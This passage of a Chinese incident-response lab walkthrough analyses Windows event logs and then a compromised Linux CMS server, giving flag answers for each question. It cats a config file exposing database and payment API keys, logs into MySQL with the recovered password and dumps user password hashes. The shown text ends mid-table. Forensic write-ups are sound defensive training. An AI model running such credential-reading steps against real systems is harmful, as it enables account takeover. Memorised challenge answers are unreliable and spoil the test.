<p><strong>事件ID 4663</strong>：尝试访问文件或目录。</p>
<ul>
<li>
<p>该事件会记录哪个用户访问了哪个文件或目录。</p>
</li>
<li>
<p>需<img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09122112.png" srcset="/img/loading.gif" lazyload alt="2025-03-09122112">要启用<strong>对象访问审计</strong>（Object Access Auditing)才能记录此事件。</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">flag&#123;<span class="hljs-built_in">SCHEMA</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q4-10"><a class="markdownIt-Anchor" href="#q4-10"></a> Q4</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">4.黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；<br></code></pre></td></tr></table></figure>
<p>筛选一下mysql，在应用程序这里</p>
<p><img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09123957.png" srcset="/img/loading.gif" lazyload alt="2025-03-09123957"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8820</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q5-8"><a class="markdownIt-Anchor" href="#q5-8"></a> Q5</h2>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">5</span>.黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为<span class="hljs-built_in">Flag</span>值提交。<br></code></pre></td></tr></table></figure>
<p><strong>事件ID 1074</strong>：系统已关闭或重启（记录重启的用户和原因）。<img src="/../../images/%E7%8E%84%E6%9C%BA/2025-03-09124445.png" srcset="/img/loading.gif" lazyload alt="2025-03-09124445"></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure>
<h1 id="第五章-linux实战-cms01"><a class="markdownIt-Anchor" href="#第五章-linux实战-cms01"></a> 第五章 linux实战-CMS01</h1>
<h2 id="q1-11"><a class="markdownIt-Anchor" href="#q1-11"></a> Q1</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客的 IP 为多少,将黑客 IP 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ip-10-0-10-1 <span class="hljs-built_in">log</span>]# <span class="hljs-built_in">cat</span> secure |grep <span class="hljs-string">&quot;Accepted &quot;</span>|awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span><br>127.0.0.1<br>192.168.20.1<br>192.168.20.1<br>192.168.20.1<br>192.168.52.1<br>36.7.107.206<br>36.7.107.206<br>58.218.234.99<br>58.218.234.99<br></code></pre></td></tr></table></figure>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.20.1</span>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="q2-11"><a class="markdownIt-Anchor" href="#q2-11"></a> Q2</h2>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">通过本地 PC SSH到服务器并且分析黑客修改的管理员密码(明文)为多少,将黑客修改的管理员密码(明文) 作为 FLAG 提交;<br></code></pre></td></tr></table></figure>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[root@ip-10-0-10-1 log]# netstat -anlupt<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    <br>tcp        0      0 0.0.0.0:12485           0.0.0.0:*               LISTEN      2455/python3        <br>tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      1468/sshd           <br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      2086/nginx: master  <br>tcp        0      0 0.0.0.0:8821            0.0.0.0:*               LISTEN      2086/nginx: master  <br>tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      1574/pure-ftpd (SER <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1468/sshd           <br>tcp        0      0 0.0.0.0:888             0.0.0.0:*               LISTEN      2086/nginx: master  <br>tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      1436/master         <br>tcp        0      0 10.0.10.1:59828         169.254.169.254:80      TIME<span class="hljs-emphasis">_WAIT   -                   </span><br><span class="hljs-emphasis">tcp        0      0 10.0.10.1:22            58.218.234.99:21714     ESTABLISHED 2372/sshd: root@pts </span><br><span class="hljs-emphasis">tcp6       0      0 :::3306                 :::*                    LISTEN      2270/mysqld         </span><br><span class="hljs-emphasis">tcp6       0      0 :::2222                 :::*                    LISTEN      1468/sshd           </span><br><span class="hljs-emphasis">tcp6       0      0 :::21                   :::*                    LISTEN      1574/pure-ftpd (SER </span><br><span class="hljs-emphasis">tcp6       0      0 :::22                   :::*                    LISTEN      1468/sshd           </span><br><span class="hljs-emphasis">tcp6       0      0 ::1:25                  :::*                    LISTEN      1436/master         </span><br><span class="hljs-emphasis">udp        0      0 0.0.0.0:68              0.0.0.0:*                           1021/dhclient   </span><br></code></pre></td></tr></table></figure>
<p><code>netstat -anlupt</code> 是一个用于查看网络连接、路由表、接口统计信息等的命令，有mysql和nginx</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ip-10-0-10-1 ~]# <span class="hljs-built_in">ls</span> /<br>bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  patch  proc  root  run  sbin  srv  sys  tmp  usr  var  www<br>[root@ip-10-0-10-1 ~]# <span class="hljs-built_in">cd</span> /www<br>[root@ip-10-0-10-1 www]# <span class="hljs-built_in">ls</span><br>backup  disk.pl  server  wwwlogs  wwwroot<br>[root@ip-10-0-10-1 www]# <span class="hljs-built_in">cd</span> backup<br>[root@ip-10-0-10-1 backup]# <span class="hljs-built_in">ls</span><br>database  file_history  nginxBak  panel  php56.Bak  php-fpm56.Bak  site<br>[root@ip-10-0-10-1 backup]# <span class="hljs-built_in">cd</span> ..<br>[root@ip-10-0-10-1 www]# <span class="hljs-built_in">cd</span> wwwlogs/<br>[root@ip-10-0-10-1 wwwlogs]# <span class="hljs-built_in">ls</span><br>127.0.0.1.error.log  127.0.0.1.<span class="hljs-built_in">log</span>  access.log  go  java  load_balancing  nginx_error.log  nodejs  other  python  request  tcp-access.log  tcp-error.log  waf<br>[root@ip-10-0-10-1 wwwlogs]# <span class="hljs-built_in">cat</span> access.log<br>...<br>127.0.0.1 - - [20/Mar/2024:14:53:16 +0800] <span class="hljs-string">&quot;GET /phpmyadmin_28ee99a9e7d063bd/sql.php?db=kaoshi&amp;table=x2_block&amp;server=1&amp;target=&amp;ajax_request=true&amp;ajax_page_request=true&amp;_nocache=1710917594040441271&amp;token=74566976347e3d424344604c33643b4f HTTP/1.1&quot;</span> 200 39014 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;BT-Panel&quot;</span><br>127.0.0.1 - - [20/Mar/2024:14:53:16 +0800] <span class="hljs-string">&quot;GET /phpmyadmin_28ee99a9e7d063bd/index.php?ajax_request=1&amp;recent_table=1&amp;no_debug=true&amp;_nocache=1710917594281142812&amp;token=74566976347e3d424344604c33643b4f HTTP/1.1&quot;</span> 200 5551 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;BT-Panel&quot;</span><br></code></pre></td></tr></table></figure>
<p>主要是phpmyadmin看看配置</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ip-10-0-10-1 wwwlogs]# <span class="hljs-built_in">cd</span> ..<br>[root@ip-10-0-10-1 www]# <span class="hljs-built_in">cd</span> wwwroot/<br>[root@ip-10-0-10-1 wwwroot]# <span class="hljs-built_in">ls</span><br>127.0.0.1  default<br>[root@ip-10-0-10-1 wwwroot]# <span class="hljs-built_in">cd</span> default/<br>[root@ip-10-0-10-1 default]# <span class="hljs-built_in">ls</span><br>[root@ip-10-0-10-1 default]# <span class="hljs-built_in">cd</span> ..<br>[root@ip-10-0-10-1 wwwroot]# <span class="hljs-built_in">cd</span> 127.0.0.1/<br>[root@ip-10-0-10-1 127.0.0.1]# <span class="hljs-built_in">ls</span><br>api  app  data  files  index.php  lib  tasks  vendor<br>[root@ip-10-0-10-1 127.0.0.1]# <span class="hljs-built_in">cat</span> index.php<br>&lt;?php<br><br>session_start();<br>define(<span class="hljs-string">&quot;PE_VERSION&quot;</span>,<span class="hljs-string">&#x27;9.0&#x27;</span>);<br>define(<span class="hljs-string">&quot;PEPATH&quot;</span>,<span class="hljs-built_in">dirname</span>(__FILE__));<br>require PEPATH.<span class="hljs-string">&quot;/lib/init.cls.php&quot;</span>;<br><span class="hljs-variable">$ginkgo</span> = new \PHPEMS\ginkgo;<br>[root@ip-10-0-10-1 127.0.0.1]# <span class="hljs-built_in">cd</span> lib/<br>[root@ip-10-0-10-1 lib]# <span class="hljs-built_in">ls</span><br>alipay.cls.php  ca.cls.php        db.cls.php      face.cls.php   gms.cls.php   init.cls.php    pdosql.cls.php  recog.cls.php     sphinx.cls.php   wechat.cls.php<br>api.cls.php     category.cls.php  editor.cls.php  files.cls.php  html.cls.php  module.cls.php  pepdo.cls.php   sendmail.cls.php  sql.cls.php      word.cls.php<br>area.cls.php    cnf.cls.php       ev.cls.php      ftp.cls.php    http.cls.php  oss.cls.php     peqr.cls.php    session.cls.php   strings.cls.php  wxpay.cls.php<br>baidu.cls.php   config.inc.php    excel.cls.php   gd.cls.php     include       payjs.cls.php   pg.cls.php      smtp.cls.php      tpl.cls.php<br>[root@ip-10-0-10-1 lib]# <span class="hljs-built_in">cat</span> config.inc.php<br>&lt;?php<br><br>/** 常规常量设置 */<br>define(<span class="hljs-string">&#x27;DOMAINTYPE&#x27;</span>,<span class="hljs-string">&#x27;off&#x27;</span>);<br>define(<span class="hljs-string">&#x27;CH&#x27;</span>,<span class="hljs-string">&#x27;exam_&#x27;</span>);<br>define(<span class="hljs-string">&#x27;CDO&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br>define(<span class="hljs-string">&#x27;CP&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>define(<span class="hljs-string">&#x27;CRT&#x27;</span>,180);<br>define(<span class="hljs-string">&#x27;CS&#x27;</span>,<span class="hljs-string">&#x27;1hqfx6ticwRxtfviTp940vng!yC^QK^6&#x27;</span>);//请随机生成32位字符串修改此处值<br>define(<span class="hljs-string">&#x27;HE&#x27;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>);<br>define(<span class="hljs-string">&#x27;PN&#x27;</span>,10);<br>define(<span class="hljs-string">&#x27;TIME&#x27;</span>,time());<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]))<br>&#123;<br>    define(<span class="hljs-string">&#x27;WP&#x27;</span>,<span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>].<span class="hljs-built_in">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    define(<span class="hljs-string">&#x27;WP&#x27;</span>,<span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>].<span class="hljs-string">&#x27;/&#x27;</span>);<br>&#125;<br>define(<span class="hljs-string">&#x27;OPENOSS&#x27;</span>,<span class="hljs-literal">false</span>);<br><br>/**接口加密设置**/<br>define(<span class="hljs-string">&#x27;APIKEY&#x27;</span>,<span class="hljs-string">&#x27;356d9abc2532ceb0945b615a922c3370&#x27;</span>);<br>define(<span class="hljs-string">&#x27;APIIV&#x27;</span>,<span class="hljs-string">&#x27;#phpems90iv*&#x27;</span>);<br>/**composer开关**/<br>define(<span class="hljs-string">&#x27;COMPOSER&#x27;</span>,0);<br>/** 数据库设置 */<br>define(<span class="hljs-string">&#x27;SQLDEBUG&#x27;</span>,0);<br>define(<span class="hljs-string">&#x27;DB&#x27;</span>,<span class="hljs-string">&#x27;kaoshi&#x27;</span>);//MYSQL数据库名<br>define(<span class="hljs-string">&#x27;DH&#x27;</span>,<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>);//MYSQL主机名，不用改<br>define(<span class="hljs-string">&#x27;DU&#x27;</span>,<span class="hljs-string">&#x27;kaoshi&#x27;</span>);//MYSQL数据库用户名<br>define(<span class="hljs-string">&#x27;DP&#x27;</span>,<span class="hljs-string">&#x27;5Sx8mK5ieyLPb84m&#x27;</span>);//MYSQL数据库用户密码<br>define(<span class="hljs-string">&#x27;DTH&#x27;</span>,<span class="hljs-string">&#x27;x2_&#x27;</span>);//系统表前缀，不用改<br><br>/** 微信相关设置 */<br>define(<span class="hljs-string">&#x27;USEWX&#x27;</span>,<span class="hljs-literal">false</span>);//微信使用开关，绑定用户，<span class="hljs-literal">false</span>时不启用<br>define(<span class="hljs-string">&#x27;WXAUTOREG&#x27;</span>,<span class="hljs-literal">false</span>);//微信开启自动注册,设置为<span class="hljs-literal">false</span>时转向登录和注册页面，绑定openid<br>define(<span class="hljs-string">&#x27;WXPAY&#x27;</span>,<span class="hljs-literal">false</span>);<br>//define(<span class="hljs-string">&#x27;FOCUSWX&#x27;</span>,<span class="hljs-literal">true</span>);//强制引导关注微信<br>//define(<span class="hljs-string">&#x27;WXQRCODE&#x27;</span>,<span class="hljs-string">&#x27;qrcode.png&#x27;</span>);//微信公众号二维码地址<br>define(<span class="hljs-string">&#x27;EP&#x27;</span>,<span class="hljs-string">&#x27;@phpems.net&#x27;</span>);//微信开启自动注册时注册邮箱后缀<br>define(<span class="hljs-string">&#x27;OPENAPPID&#x27;</span>,<span class="hljs-string">&#x27;wx7703aa61284598ea&#x27;</span>);//开放平台账号<br>define(<span class="hljs-string">&#x27;OPENAPPSECRET&#x27;</span>,<span class="hljs-string">&#x27;36745ed4d4ea9da9f25e7b3ccd06d5ef&#x27;</span>);<br>define(<span class="hljs-string">&#x27;MPAPPID&#x27;</span>,<span class="hljs-string">&#x27;wx7703aa61284598ea&#x27;</span>);//小程序账号<br>define(<span class="hljs-string">&#x27;MPAPPSECRET&#x27;</span>,<span class="hljs-string">&#x27;36745ed4d4ea9da9f25e7b3ccd06d5ef&#x27;</span>);<br>define(<span class="hljs-string">&#x27;WXAPPID&#x27;</span>,<span class="hljs-string">&#x27;wx6967d8319bfeea19&#x27;</span>);//公众号账号<br>define(<span class="hljs-string">&#x27;WXAPPSECRET&#x27;</span>,<span class="hljs-string">&#x27;4d462a770aebb7460e2284cbd448cee0&#x27;</span>);<br>define(<span class="hljs-string">&#x27;WXMCHID&#x27;</span>,<span class="hljs-string">&#x27;1414206302&#x27;</span>);//MCHID<br>define(<span class="hljs-string">&#x27;WXKEY&#x27;</span>,<span class="hljs-string">&#x27;72653616204d16975931a46f9296092e&#x27;</span>);<br><br>/** 支付宝相关设置 */<br>define(<span class="hljs-string">&#x27;ALIPAY&#x27;</span>,<span class="hljs-literal">false</span>);<br>/**MD5**/<br>define(<span class="hljs-string">&#x27;ALIPART&#x27;</span>,<span class="hljs-string">&#x27;111171660&#x27;</span>);<br>define(<span class="hljs-string">&#x27;ALIKEY&#x27;</span>,<span class="hljs-string">&#x27;os11111117fmljymmcau&#x27;</span>);<br>define(<span class="hljs-string">&#x27;ALIACC&#x27;</span>,<span class="hljs-string">&#x27;111111@qq.com&#x27;</span>);<br>/**RAS2**/<br>define(<span class="hljs-string">&#x27;ALIAPPID&#x27;</span>,<span class="hljs-string">&#x27;2016072738&#x27;</span>);<br>define(<span class="hljs-string">&#x27;ALIPRIKEY&#x27;</span>,<span class="hljs-string">&#x27;MIIEogIBAMXsHR2vhl3BqWBbXfDaIcrJgNssIUddVCX6fT9YWiPXCiCeu5M=&#x27;</span>);<br>define(<span class="hljs-string">&#x27;ALIPUBKEY&#x27;</span>,<span class="hljs-string">&#x27;MIIBIjANXRkaDw6wIDAQAB&#x27;</span>);<br><br>/** payjz相关设置 */<br>define(<span class="hljs-string">&#x27;PAYJSASWX&#x27;</span>,<span class="hljs-string">&#x27;NO&#x27;</span>);//使用PAYJZ的微信支付接口代替微信支付，不使用请设置为NO<br>define(<span class="hljs-string">&#x27;PAYJSMCHID&#x27;</span>,<span class="hljs-string">&#x27;1551052561&#x27;</span>);<br>define(<span class="hljs-string">&#x27;PAYJSKEY&#x27;</span>,<span class="hljs-string">&#x27;Zz8ks1ZP3UPKeTGi&#x27;</span>);<br><br><br><br>?&gt;[root@ip-10-0-10-1 lib]#  mysql -ukaoshi -p5Sx8mK5ieyLPb84m<br>mysql: [Warning] Using a password on the <span class="hljs-built_in">command</span> line interface can be insecure.<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 2<br>Server version: 5.7.44-<span class="hljs-built_in">log</span> Source distribution<br><br>Copyright (c) 2000, 2023, Oracle and/or its affiliates.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| kaoshi             |<br>+--------------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; use kaoshi;<br>Database changed<br><br>mysql&gt; show tables;<br>+---------------------+<br>| Tables_in_kaoshi    |<br>+---------------------+<br>| x2_answer           |<br>| x2_app              |<br>| x2_area             |<br>| x2_ask              |<br>| x2_attach           |<br>| x2_attachtype       |<br>| x2_basic            |<br>| x2_block            |<br>| x2_category         |<br>| x2_cequeue          |<br>| x2_certificate      |<br>| x2_city             |<br>| x2_cityarea         |<br>| x2_cnttouser        |<br>| x2_comment          |<br>| x2_config           |<br>| x2_consumelog       |<br>| x2_content          |<br>| x2_coupon           |<br>| x2_course           |<br>| x2_coursesubject    |<br>| x2_docfloder        |<br>| x2_dochistory       |<br>| x2_docs             |<br>| x2_examhistory      |<br>| x2_exams            |<br>| x2_examsession      |<br>| x2_exercise         |<br>| x2_favor            |<br>| x2_feedback         |<br>| x2_knows            |<br>| x2_log              |<br>| x2_module           |<br>| x2_module_fields    |<br>| x2_navs             |<br>| x2_openbasics       |<br>| x2_opencourse       |<br>| x2_orders           |<br>| x2_poscontent       |<br>| x2_position         |<br>| x2_progress         |<br>| x2_province         |<br>| x2_quest2knows      |<br>| x2_questionanalysis |<br>| x2_questionrows     |<br>| x2_questions        |<br>| x2_questype         |<br>| x2_record           |<br>| x2_recorddata       |<br>| x2_reply            |<br>| x2_sections         |<br>| x2_seminar          |<br>| x2_seminar_content  |<br>| x2_seminar_elem     |<br>| x2_seminar_layout   |<br>| x2_seminar_tpls     |<br>| x2_session          |<br>| x2_subject          |<br>| x2_user             |<br>| x2_user_group       |<br>| x2_wxlogin          |<br>+---------------------+<br>61 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; SELECT * FROM x2_user_group;<br>+---------+--------------+---------------+---------------+------------+--------------------+--------------+<br>| groupid | groupname    | groupmoduleid | groupdescribe | groupright | groupmoduledefault | groupdefault |<br>+---------+--------------+---------------+---------------+------------+--------------------+--------------+<br>|       1 | 管理员       |             1 | 管理员        |            |                  1 |            0 |<br>|       8 | 普通用户     |             9 | 普通用户      |            |                  0 |            1 |<br>|       9 | 教师         |            12 | 教师          |            |                  0 |            0 |<br>+---------+--------------+---------------+---------------+------------+--------------------+--------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.01 sec)<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from x2_user;<br>+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+<br>| userid | useropenid | userunionid | username        | useremail      | userpassword                     | usercoin | userregip      | userregtime | userlogtime | userverifytime | usergroupid | usermoduleid | useranswer | manager_apps                                                                                                                 | usertruename       | normal_favor | teacher_subjects                                                                                                                                                                             | userprofile | usergender | userphone | useraddress | userphoto                                               | userstatus | normal_sfz |<br>+--------+------------+-------------+-----------------+----------------+----------------------------------+----------+----------------+-------------+-------------+----------------+-------------+--------------+------------+------------------------------------------------------------------------------------------------------------------------------+--------------------+--------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+------------+-----------+-------------+---------------------------------------------------------+------------+------------+<br>|      1 |            | NULL        | peadmin         | 958074@163.com | f6f6eb5ace977d7e114377cc7098b7e3 |      279 | 127.0.0.1      |  1471795200 |           0 |           NULL |           1 |            0 | NULL       | a:7:&#123;i:0;s:4:<span class="hljs-string">&quot;user&quot;</span>;i:1;s:7:<span class="hljs-string">&quot;content&quot;</span>;i:2;s:4:<span class="hljs-string">&quot;exam&quot;</span>;i:3;s:8:<span class="hljs-string">&quot;document&quot;</span>;i:4;s:6:<span class="hljs-string">&quot;course&quot;</span>;i:5;s:4:<span class="hljs-string">&quot;bank&quot;</span>;i:6;s:8:<span class="hljs-string">&quot;autoform&quot;</span>;&#125; | 111111111111111111 |              |                                                                                                                                                                                              |             | 男         |           | 信息部      | files/attach/images/content/20230802/16909740072788.jpg |          3 |            |<br>|      2 |            | NULL        | 教师管理员      | 958074@126.com | 96e79218965eb72c92a549dd5a330112 |       98 | 127.0.0.1      |  1471795200 |           0 |           NULL |           9 |            0 | NULL       |                                                                                                                              | 213123             |              | a:14:&#123;i:0;s:2:<span class="hljs-string">&quot;13&quot;</span>;i:1;s:2:<span class="hljs-string">&quot;12&quot;</span>;i:2;s:1:<span class="hljs-string">&quot;5&quot;</span>;i:3;s:1:<span class="hljs-string">&quot;4&quot;</span>;i:4;s:1:<span class="hljs-string">&quot;3&quot;</span>;i:5;s:1:<span class="hljs-string">&quot;1&quot;</span>;i:6;s:1:<span class="hljs-string">&quot;2&quot;</span>;i:7;s:2:<span class="hljs-string">&quot;17&quot;</span>;i:8;s:2:<span class="hljs-string">&quot;15&quot;</span>;i:9;s:2:<span class="hljs-string">&quot;16&quot;</span>;i:10;s:2:<span class="hljs-string">&quot;18&quot;</span>;i:11;s:2:<span class="hljs-string">&quot;19&quot;</span>;i:12;s:2:<span class="hljs-string">&quot;20&quot;</span>;i:13;s:2:<span class="hljs-string">&quot;21&quot;</span>;&#125; | 77777       |            |           |             |                                                         |          3 |            |<br>|      3 |            |             | zgsf            | zgsf@Admin.com | af0c68603004a1b5af4d87a71a813057 |        0 | 192.168.20.131 |  1709795218 |           0 |              0 |           8 |            0 |            |                                                                                                                              |                    |              |                                                                                                                                                                                              |             |            |           |             |                                                         |          0 |            |<br>|      4 |            |             | zgsfAdmin       | zgsf@zgsf.com  | 